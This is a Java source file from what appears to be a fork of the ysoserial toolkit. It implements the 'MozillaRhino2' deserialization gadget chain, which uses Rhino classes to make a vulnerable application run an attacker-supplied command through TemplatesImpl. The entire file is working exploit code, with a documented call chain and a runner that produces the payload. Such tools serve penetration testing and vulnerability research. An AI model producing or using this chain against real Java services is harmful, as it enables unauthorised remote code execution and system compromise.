package dogeser.payloads;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

/*

    Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject

    Chain:

    NativeJavaObject.readObject()
      JavaAdapter.readAdapterObject()
        ObjectInputStream.readObject()
          ...
            NativeJavaObject.readObject()
              JavaAdapter.readAdapterObject()
                JavaAdapter.getAdapterClass()
                  JavaAdapter.getObjectFunctionNames()
                    ScriptableObject.getProperty()
                        ScriptableObject.get()
                          ScriptableObject.getImpl()
                            Method.invoke()
                              Context.enter()
        JavaAdapter.getAdapterClass()
          JavaAdapter.getObjectFunctionNames()
            ScriptableObject.getProperty()
              NativeJavaArray.get()
                NativeJavaObject.get()
                  JavaMembers.get()
                    Method.invoke()
                      TemplatesImpl.getOutputProperties()
                        ...

    by @_tint0

*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"rhino:js:1.7R2"})
@dogeser.payloads.annotation.Authors({ Authors.TINT0 })
public class MozillaRhino2 implements ObjectPayload<Object> {

    public Object getObject( String command) throws Exception {
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", dogeser.payloads.util.Reflections.createWithoutConstructor(ClassCache.class));
        dogeser.payloads.util.Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        Object initContextMemberBox = dogeser.payloads.util.Reflections.createWithConstructor(
            Class.forName("org.mozilla.javascript.MemberBox"),
            (Class<Object>)Class.forName("org.mozilla.javascript.MemberBox"),
            new Class[] {Method.class},
            new Object[] {Context.class.getMethod("enter")});

        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        dogeser.payloads.util.Reflections.setAccessible(makeSlot);
        Object slot = makeSlot.invoke(initContextScriptableObject, "foo", 0, 4);
        dogeser.payloads.util.Reflections.setFieldValue(slot, "getter", initContextMemberBox);

        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        dogeser.payloads.util.Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        dogeser.payloads.util.Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        dogeser.payloads.util.Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject",
            this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        dogeser.payloads.util.Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);

        NativeJavaArray nativeJavaArray = dogeser.payloads.util.Reflections.createWithoutConstructor(NativeJavaArray.class);
        dogeser.payloads.util.Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
        dogeser.payloads.util.Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(command));
        nativeJavaArray.setPrototype(scriptableObject);
        dogeser.payloads.util.Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        dogeser.payloads.util.Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        dogeser.payloads.util.Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        dogeser.payloads.util.Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
            this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

        return nativeJavaObject;
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino2.class, args);
    }

}
